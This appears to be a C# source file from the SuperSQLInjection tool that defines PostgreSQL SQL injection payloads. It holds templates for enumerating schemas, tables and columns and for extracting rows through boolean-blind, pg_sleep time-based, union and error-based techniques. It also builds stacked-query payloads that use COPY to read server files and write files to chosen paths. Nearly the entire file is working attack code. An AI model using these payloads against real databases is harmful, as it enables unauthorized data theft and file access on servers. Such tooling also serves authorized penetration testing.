using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class PostgreSQL
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/vers/postgresql.txt";
        public static List<String> vers = FileTool.readFileToList(path);

        public static String char_length = "(char_length({data}))";
        
        //数据库数量
        public static String dbs_count = "(select count(distinct(schemaname)) from pg_tables)";
        //表数量
        public static String tables_count = "(select count(tablename) from pg_tables where schemaname='{dbname}')";
        //列数量
        public static String columns_count = "(select count(1) from information_schema.columns where table_schema='{dbname}' and table_name='{table}')";


        //获取数据库名
        public static String db_value = "(select distinct(schemaname) from pg_tables offset {index} limit 1)";
        //获取表名称
        public static String table_value = "(select tablename from pg_tables where schemaname='{dbname}' offset {index} limit 1)";
        //获取列名称
        public static String column_value = "(select column_name from information_schema.columns where table_schema='{dbname}' and table_name='{table}' offset {index} limit 1)";


        public static String bool_length = "char_length(cast({data} as text))";

        public static String bool_value = "ascii(substring(cast({data} as text),{index},1))";

        public static String bool_data = " {data}>{len}";

        public static String substr_one_value = "(substring(cast({data} as text),{index},1))";

        public static String substr_nocast = "(substring({data},{index},1))";

        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";

        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";
        
        //多字符长度判断
        //public static String mu_value = "(hex(convert((mid({data},{index},1)) using UTF8)))";

        //bool方式字符长度判断
        public static String ver_length = " "+ bool_length + ">{len}";

        //bool方式获取值
        public static String ver_value = " "+ bool_value + ">{len}";
       

        //bool方式获取值
        public static String char_length_val = " " + char_length + ">{len}";

        //bool方式获取值
        public static String bool_ord_value = " " + substr_one_value + ">{len}";

        //获取行数据bool
        public static String data_value = "(select {columns} from {dbname}.{table} offset {index} limit 1)";
    
        //获取数据bool,利用子查询，防止数据每一行可能存在不对称的可能
        public static String data_value_order = "(select {column} from (select {columns} from {dbname}.{table} offset {index} limit 1)tmp)";

        //union获取数据条数
        public static String data_count = "(select count(1) from {dbname}.{table})";
        //bool判断数据条数
        public static String bool_datas_count = " " + data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data}";

        //error方式
        public static String error_value = " 1=cast((chr(94)||chr(94)||chr(33)||({data})||chr(33)||chr(94)||chr(94)) as numeric)";

        //public static String hex = "(select hex({data}))";
        public static String hex_value = "(select hex(convert(({data}) using UTF8)))";

        public static String substr_value = "(select substr({data},{start},{len}))";

        public static String readFile = " 1=1;drop table if exists ssqlinjection;create table ssqlinjection(data text);copy ssqlinjection from '{path}';--";

        public static String createTable = " 1=1;drop table if exists ssqlinjection;create table ssqlinjection (data text);--";

        public static String insertLineValue = " 1=1;insert into ssqlinjection(data) values ('{content}');--";

        public static String writeFile = " 1=1;copy ssqlinjection(data) to '{path}';--";


        public static String drop_table = " 1=1;drop table if exists ssqlinjection;--";


        public static String file_content = "(select data from ssqlinjection)";
        public static String file_content_Count = "(select count(1) from ssqlinjection)";
        public static String file_content_data = "(select data from ssqlinjection offset {index} limit 1)";


        public static String getBoolDataBySleep(String data,int maxTime)
        {
            return " (case when ((" + data + ")>{len}) then (select false from pg_sleep(" + maxTime + ")) else false end)";
        }

        public static String getBoolCountBySleep(String data, int maxTime)
        {
            return " (case when ((" + data + ")) then (select false from pg_sleep(" + maxTime + ")) else false end)";
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="columnsLen">列长</param>
        /// <param name="showIndex">显示列</param>
        /// <param name="Fill">填充</param>
        /// <param name="dbname">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="column">获取数据的字段</param>
        /// <param name="index">第几行数据，1开始</param>
        public static String getErrorDataValue(String dbname, String table, int index, List<String> columns)
        {
            String data = data_value.Replace("{columns}", unionColumns(columns, "||chr(36)||chr(9)||chr(36)||"));
            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
            return error_value.Replace("{data}", d);
        }

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {

                sb.Append("coalesce(cast(" + column + " as text),chr(32))" + unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }

        public static String getReadFilePayload(String path)
        {
            return readFile.Replace("{path}", path);
        }
        public static String getInsertLineValue(String content)
        {
            return insertLineValue.Replace("{content}", content);
        }
        public static String getWriteFilePayload(String path)
        {
            return writeFile.Replace("{path}", path);    
        }
        public static String getUnionDataValue(int columnsLen, int showIndex, String dataPayLoad, String dbname, String table, String index)
        {
            StringBuilder sb = new StringBuilder();

            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(chr(94)||chr(94)||chr(33)||" + dataPayLoad.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index) + "||chr(33)||chr(94)||chr(94)),");
                }
                else
                {
                    sb.Append("null,");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }



        public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            String data = "chr(94)||chr(94)||chr(33)||" + unionColumns(columns, "||chr(36)||chr(9)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append(data_value.Replace("{columns}", data).Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index));
                    sb.Append(",");
                }
                else
                {
                    sb.Append("null,");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }


        /// <summary>
        /// 生成查询列数据
        /// </summary>
        /// <param name="columns">列明</param>
        /// <returns></returns>
        public static String concatMySQLColumn(String column)
        {
            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
            sb.Append(column);
            sb.Append(",0x215e5e)");
            return sb.ToString();

        }

        public static String getBoolDataPayLoad(String column, List<String> columns, String dbName, String table, int index)
        {
            String data = data_value_order.Replace("{column}", column).Replace("{columns}", String.Join(",", columns)).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
            return data;
        }

        /// <summary>
        /// 反射条调用，加载显示支持的文件操作
        /// </summary>
        /// <returns></returns>
        public static List<String> getShowCanDoFile()
        {
            List<String> list = new List<String>();
            list.Add("PostgreSQL Copy写文件");
            list.Add("PostgreSQL Copy读文件");
            return list;
        }

    }
}
